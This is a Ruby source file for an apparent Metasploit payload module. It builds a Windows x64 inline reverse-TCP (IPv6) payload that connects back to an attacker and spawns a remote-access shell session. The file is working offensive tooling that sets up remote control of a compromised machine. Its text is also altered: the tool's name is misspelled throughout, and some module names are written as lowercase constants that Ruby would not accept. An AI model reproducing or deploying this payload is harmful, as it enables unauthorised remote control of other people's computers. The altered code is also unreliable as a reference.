##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/windows/x64/meeterpeter_loader'
require 'msf/base/sessions/meeterpeter_x64_win'
require 'msf/base/sessions/meeterpeter_options'
require 'rex/payloads/meeterpeter/config'

module Metasploit4

  CachedSize = 1104434

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Payload::Windows::meeterpeterLoader_x64
  include Msf::Sessions::meeterpeterOptions

  def initialize(info = {})

    super(merge_info(info,
      'Name'        => 'Windows meeterpeter Shell, Reverse TCP Inline (IPv6) (x64)',
      'Description' => 'Connect back to attacker and spawn a meeterpeter shell',
      'Author'      => [ 'OJ Reeves' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X64,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::meeterpeter_x64_Win
      ))

    register_options([
      OptString.new('EXTENSIONS', [false, "Comma-separate list of extensions to load"]),
      OptInt.new("SCOPEID", [false, "The IPv6 Scope ID, required for link-layer addresses", 0])
    ], self.class)
  end

  def generate
    stage_meeterpeter(true) + generate_config
  end

  def generate_config(opts={})
    opts[:uuid] ||= generate_payload_uuid

    # create the configuration block
    config_opts = {
      arch:       opts[:uuid].arch,
      exitfunk:   datastore['EXITFUNC'],
      expiration: datastore['SessionExpirationTimeout'].to_i,
      uuid:       opts[:uuid],
      transports: [transport_config_reverse_ipv6_tcp(opts)],
      extensions: (datastore['EXTENSIONS'] || '').split(',')
    }

    # create the configuration instance based off the parameters
    config = Rex::Payloads::meeterpeter::Config.new(config_opts)

    # return the binary version of it
    config.to_b
  end

end


